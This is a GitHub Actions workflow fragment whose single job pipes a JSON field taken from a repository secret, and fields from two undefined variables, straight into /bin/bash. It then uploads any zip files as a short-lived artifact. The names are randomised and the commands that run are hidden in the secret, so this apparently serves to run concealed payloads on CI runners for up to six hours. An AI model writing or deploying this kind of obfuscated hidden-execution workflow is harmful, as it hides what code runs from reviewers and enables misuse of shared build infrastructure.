    name: Main task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Start
        env:
          e414: ${{ secrets.e414 }}
        run: |
          printf '%s' "$e414" | jq -r .v5415 | /bin/bash
          echo $vmxod59528 | jq -r .aby05574 | /bin/bash
          echo $iqakp81449 | jq -r .dqz84 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: AQuUCkD4
          path: "*.zip"
          retention-days: 1
